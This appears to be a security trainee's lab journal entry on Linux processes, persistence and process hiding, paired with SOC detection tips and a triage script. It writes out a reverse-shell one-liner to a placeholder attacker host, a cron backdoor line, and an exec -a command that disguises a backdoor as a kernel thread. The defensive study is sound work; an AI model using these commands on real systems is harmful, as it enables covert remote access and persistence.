# Day 4: Processes, Persistence, and Hiding in Plain Sight

**Date:** 2026-04-13
**Time Spent:** 2.5 hours

## Objectives
- Understand Linux process hierarchy (PID, PPID, daemons).
- Create a covert backdoor (HTTP server) and hide it.
- Establish persistence via cron, bashrc, and systemd.
- Use SOC triage commands to hunt hidden processes.
- Develop an incident response script (`ghost-hunter.sh`).

## Process Investigation Commands
| Command | Purpose |
|---------|---------|
| `ps auxf` | Process tree with parent/child relationships |
| `lsof -i :port` | Identify process using a specific port |
| `netstat -tulpn` | Show listening ports with program names |
| `systemctl list-units` | List systemd services |

## Persistence Locations to Monitor
- `/var/spool/cron/crontabs/*` – User cron jobs
- `~/.bashrc`, `~/.profile` – Shell startup scripts
- `/etc/systemd/system/*.service` – Custom services
- `/etc/rc.local` – Legacy startup script

## Black Hat Techniques Demonstrated
1. **Process Masquerading:** Renaming binary to `[kworker/u:0]` to mimic kernel thread.
2. **Cron Persistence:** `*/5 * * * * /tmp/backdoor` restarts every 5 minutes.
3. **Reverse Shell:** `bash -i >& /dev/tcp/attacker/4444 0>&1`

## SOC Detection Strategies
- Look for non-root processes with `[bracketed]` names.
- Monitor outbound connections to non-standard ports.
- Baseline crontabs and alert on changes.
- Use `lsof` to correlate ports with binary paths.

## Artifacts Created
- Script: `ghost-hunter.sh` – Triage tool for incident response.
- Screenshots: Hidden process detection, reverse shell connection.

## Troubleshooting and Reset (Day 4 Recovery)

### Issues Encountered
- Attempted to create a file with a slash in the name: `/tmp/[kworker/u:0]` – Linux forbids `/` in filenames.
- Used `sudo exec -a ...` causing stopped jobs and hung processes.
- Port 8080 already in use due to previous failed attempts.

### Resolution Steps
1. Killed all processes using port 8080 with `sudo fuser -k 8080/tcp`.
2. Removed all persistence artifacts (crontab, bashrc lines, systemd service).
3. Recreated the ghost using a subshell wrapper: `( exec -a "[kworker/u:0]" /tmp/.kworker -m http.server 8080 ) &`.
4. Used quotes appropriately when dealing with special characters.

### Key Learnings
- **Filename vs. Process Name:** The name on disk cannot contain `/`. Use `exec -a` to set a display name with slashes.
- **Backgrounding with `exec`:** Always wrap `exec -a` in a subshell `( ... ) &` to avoid replacing the current shell.
- **Port Conflicts:** Always verify with `lsof -i :PORT` before launching a service.

### Final Lab State
- Ghost process running under user `ghost` with display name `[kworker/u:0]`.
- Persistence via cron, bashrc, and systemd service successfully configured.
- Detection script `ghost-hunter.sh` correctly identifies the masqueraded process.

## Next Up
Day 5: Networking for Hunters – TCP/IP Handshake and Nmap Reconnaissance.
